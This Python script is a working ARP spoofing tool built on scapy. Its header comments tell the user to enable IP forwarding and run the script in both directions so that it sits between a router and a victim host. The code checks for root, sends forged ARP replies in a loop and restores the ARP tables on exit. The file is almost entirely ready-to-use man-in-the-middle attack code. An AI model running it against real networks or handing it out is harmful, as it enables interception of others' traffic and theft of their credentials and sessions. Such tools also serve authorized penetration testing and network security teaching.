# first enable ip_forward to allow flow packets like a router
# echo 1 > /proc/sys/net/ipv4/ip_forward
# python arp-spoofer.py -t 192.168.1.1 -s 192.168.1.105 -i eno1 --> telling 192.168.1.1 i am 192.168.1.105
# python arp-spoofer.py -t 192.168.1.105 -s 192.168.1.1 -i eno1 --> telling 192.168.1.105 i am 192.168.1.1

import scapy.all as scapy
from argparse import ArgumentParser as AP
from os import getuid
from subprocess import call
from time import sleep
from termcolor import colored


def check_sudo():
    if getuid() != 0:
        print(
            f"{colored('[-]', 'red')} You must be super user to run this script")
        exit(1)


def get_mac(ip, interface):
    local_ip = scapy.get_if_addr(interface)
    if local_ip == ip:
        return scapy.Ether().src

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    response = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    for packet in response:
        return packet[1].hwsrc


def restore(dest_ip, src_ip, src_mac, dest_mac):
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=src_ip, hwsrc=src_mac)

    scapy.send(packet, count=4, verbose=False)


check_sudo()


parser = AP()

parser.add_argument('-t', '--target', dest='target', required=True,
                    help='target ip to be foolish', default=None)
parser.add_argument('-s', '--source', dest='source', required=True,
                    help='fake source ip to send packets', default=None)
parser.add_argument('-d', '--delay', dest='delay', default=2,
                    help='set the daily between sending packets')
parser.add_argument('-i', '--interface', dest='interface', required=True,
                    help='set the interface where to send the packets')

args = parser.parse_args()

call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)

src_mac = get_mac(args.source, args.interface)
trg_mac = get_mac(args.target, args.interface)

packet = scapy.ARP(op=2, pdst=args.target, hwdst=trg_mac,
                   psrc=args.source)  # op = response packet

count = 1
while True:
    try:
        scapy.send(packet, verbose=False)
        print(
            f"\r{colored('[+]', 'green')} sending spoof packet to {colored(args.target, 'blue')} telling {colored(args.source, 'blue')} is at {colored(scapy.Ether().src, 'yellow')} on {colored(scapy.get_if_addr(args.interface), 'yellow')}   #{count}", end='')
        count += 1
        sleep(int(args.delay))
    except KeyboardInterrupt:
        call('echo 0 > /proc/sys/net/ipv4/ip_forward', shell=True)
        restore(args.target, args.source, src_mac, trg_mac)
        print(f"\n{colored('[!]', 'green')} spoofing quit")
        exit(0)
